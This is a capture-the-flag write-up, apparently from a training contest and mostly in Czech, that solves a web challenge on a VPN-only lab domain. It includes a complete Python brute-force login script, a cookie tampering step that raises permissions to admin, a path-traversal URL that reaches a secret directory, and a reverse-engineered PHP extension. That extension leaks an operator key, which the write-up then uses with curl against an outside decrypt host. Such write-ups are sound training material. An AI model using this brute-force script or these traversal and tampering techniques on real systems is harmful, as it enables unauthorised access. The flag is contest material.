# Quantum Keys Repository (4)

## Zadání

Hi Senior Researcher,

the administrator was experimenting with the Quantum Keys repository when something went spectacularly wrong. Witnesses report a brief flash, an inexplicable quantum fluctuation, and what can only be described as a quantum implosion.

The administrator was nowhere to be found. Some say he was caught in a quantum implosion; others suspect the experiment simply relocated him to a different spin location. The repository, however, survived the incident. The area has since been declared off-limits, with nobody permitted within one Heisenberg unit.

Your task is to find the right key, figure out how it works, and decrypt key documents.

Stay curious!

Last known superposition of the quantum repository was <http://quantum-keys-repository.nren.tcc>

## Nápovědy (Hints)

1. All services in `nren.tcc` domain are accessible via VPN only.
2. The administrator used the standard `admin` login. His known password policy was simple: use the login name, add at least one special character, and at least one number.

## Řešení

Po otevření stránky ze zadání se zobrazí přihlašovací stránka. Dle nápovědy je uživatel `admin` a popis, jak je konstruované heslo.

Z <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt> si vyfiltruju jen řádky s čísly (555 hesel).

`grep -E '^[0-9]+$' 10k-most-common.txt > 10k-most-common_num.txt`

Program na bruteforce hledání hesla (AI assisted).

```python
import sys
import requests
import re
from urllib.parse import urljoin
from itertools import product

DEFAULT_URL = "http://quantum-keys-repository.nren.tcc"
DEFAULT_USERNAME = "admin"
SPECIAL_CHARS = ['!', '@', '#', '$', '%', '^', '&', '*', '_', '-', '.', '+', '=', '?']
NUMBERS = open("10k-most-common_num.txt", "r").read().split("\n")
BASE_FORMS = ['admin', 'Admin', 'ADMIN']


def extract_csrf_token(html):
    """Extract CSRF token from login page HTML."""
    match = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None


def try_login(session, url, username, password, csrf_token):
    """Attempt login with given credentials."""
    login_url = url
    data = {
        'csrf': csrf_token,
        'username': username,
        'password': password,
        'login': 'Sign in'
    }

    try:
        response = session.post(login_url, data=data, timeout=10)
        # If "Invalid username or password" is NOT in response, login succeeded
        return "Invalid username or password" not in response.text
    except Exception as e:
        print(f"Error during login attempt: {e}")
        return False


def brute_force_password(url, username, verbose=False):
    """Brute-force admin password based on policy."""
    session = requests.Session()

    # Get initial CSRF token
    print("[*] Fetching login page for CSRF token...")
    try:
        response = session.get(url, timeout=10)
        csrf_token = extract_csrf_token(response.text)
        if not csrf_token:
            print("[!] Could not extract CSRF token from login page")
            return None
        print(f"[+] CSRF token obtained: {csrf_token[:20]}...")
    except Exception as e:
        print(f"[!] Error fetching login page: {e}")
        return None

    # Generate password candidates
    print(f"[*] Generating password candidates (policy: {username} + special + number)...")
    candidates = []

    # Generate: base+special+number and base+number+special
    for base in BASE_FORMS:
        for special, number in product(SPECIAL_CHARS, NUMBERS):
            candidates.append(f"{base}{special}{number}")
            candidates.append(f"{base}{number}{special}")

    print(f"[*] Total candidates to try: {len(candidates)}")

    # Try each candidate
    for i, password in enumerate(candidates, 1):
        if verbose or i % 20 == 0:
            print(f"[*] Attempt {i}/{len(candidates)}: {username}:{password}")

        if try_login(session, url, username, password, csrf_token):
            print(f"\n[+] SUCCESS! Found credentials:")
            print(f"    Username: {username}")
            print(f"    Password: {password}")
            return password

    print(f"\n[!] No password found after {len(candidates)} attempts")
    return None


def main():
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = DEFAULT_URL

    if len(sys.argv) > 2:
        username = sys.argv[2]
    else:
        username = DEFAULT_USERNAME

    verbose = '-v' in sys.argv or '--verbose' in sys.argv

    print(f"[*] Target URL: {url}")
    print(f"[*] Username: {username}")
    print()

    password = brute_force_password(url, username, verbose=verbose)

    if password:
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == '__main__':
    main()
```

Za chvíli najde heslo `admin#1234`.

Po přihlášení je na stránce mimo jiné text

`For your security, never leave an active session unattended.`

což nakonec odkazuje na to, že se máme podívat na session data, tedy cookie, kde je

`permissions=user`

po změně na

`permissions=admin`

se v menu objeví záložka `Repository` s možností prohlížet soubory a procházet adresáře.

Dá se stáhnout [index.php](index.php) a [system.php](system.php).

Procházení adresářů obsahuje chybu typ path traversal, takže je možné se dostat až do `http://quantum-keys-repository.nren.tcc/system.php?section=repository&dir=/var/www/html/public/../secret`, kde je soubor `flag.inc.php`, který obsahuje

```php
<?php
  decrypt_payload("ARnzLEyOBzP8Nid50h3l3/wsVvkrqY90fsGXUWeMKo2J47MxAgOVwUwAN8g9hHZMESMfRr96WcYPnoZoJrVttLYtRrDqlH2WqlzvmgiazuUoH6+1faHFt8N7L5iTKK2vuW/XUjtIScFqA9x8fAOXAZxwiz9rNBw0gIE/bXDptsHnr5fh0HTn");
```

V `system.php` je také možnost pomocí parametru `section` načíst libovolný soubor. Bohužel `http://quantum-keys-repository.nren.tcc/system.php?section=../secret/flag` vrací `SECURITY POLICY: CODE EXECUTION DISABLED`.

Ve všech .inc.php souborech se používá `decrypt_payload`, což není standardní součást PHP a bude potřeba najít, odkud se bere.

Z `http://quantum-keys-repository.nren.tcc/system.php?section=phpinfo` se dá vyčíst, že je vložený modul `decryptor` s konfigurací `/usr/local/etc/php/conf.d/docker-php-ext-decryptor.ini`, které je jen `extension=decryptor`.

Modul se dá stáhnout z `/usr/local/lib/php/extensions/no-debug-non-zts-20240924/decryptor.so`.

A tady je klíč

```c
nsigned __int64 __fastcall zif_decrypt_payload(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // r12
  const char *v5; // r13
  size_t v6; // r12
  _QWORD *v7; // rbx
  void *v8; // rax
  int v9; // eax
  __int64 v11; // [rsp+0h] [rbp-A48h] BYREF
  _BYTE v12[8]; // [rsp+8h] [rbp-A40h] BYREF
  _BYTE v13[512]; // [rsp+10h] [rbp-A38h] BYREF
  _BYTE v14[2056]; // [rsp+210h] [rbp-838h] BYREF
  unsigned __int64 v15; // [rsp+A18h] [rbp-30h]

  v2 = *(unsigned int *)(a1 + 44);
  v15 = __readfsqword(0x28u);
  if ( (unsigned int)zend_parse_parameters(v2, "s", &v11, v12) == -1 )
  {
    *(_DWORD *)(a2 + 8) = 1;
  }
  else
  {
    n = 0LL;
    v3 = curl_easy_init();
    if ( v3 )
    {
      ap_php_snprintf(v13, 512LL, "X-Operator-Key: %s", "C7u1EVybH9YtCyphbi73yqvUndSYHkUqzkQdnbWHjkY");
      v4 = curl_slist_append(0LL, v13);
      curl_easy_setopt(v3, 10002LL, "http://coolhacker124.tcc:5005/decrypt");
      curl_easy_setopt(v3, 47LL, 1LL);
      curl_easy_setopt(v3, 10023LL, v4);
      v5 = (const char *)curl_easy_escape(v3, v11, 0LL);
      ap_php_snprintf(v14, 2048LL, "data=%s", v5);
```

Na dekódování se volá externí služba na <http://coolhacker124.tcc:5005/decrypt>.

Stačí zavolat

```sh
curl -s -X POST "http://coolhacker124.tcc:5005/decrypt" \
  -H "X-Operator-Key: C7u1EVybH9YtCyphbi73yqvUndSYHkUqzkQdnbWHjkY" \
  --data-urlencode "data=ARnzLEyOBzP8Nid50h3l3/wsVvkrqY90fsGXUWeMKo2J47MxAgOVwUwAN8g9hHZMESMfRr96WcYPnoZoJrVttLYtRrDqlH2WqlzvmgiazuUoH6+1faHFt8N7L5iTKK2vuW/XUjtIScFqA9x8fAOXAZxwiz9rNBw0gIE/bXDptsHnr5fh0HTn"
```

a získáme flag

```text
echo "SECURITY POLICY: CODE EXECUTION DISABLED"; exit; $flag = "FLAG{xQsB-mGHP-PHNC-FMMN}"; echo $flag;
```

## Flag

`FLAG{xQsB-mGHP-PHNC-FMMN}`
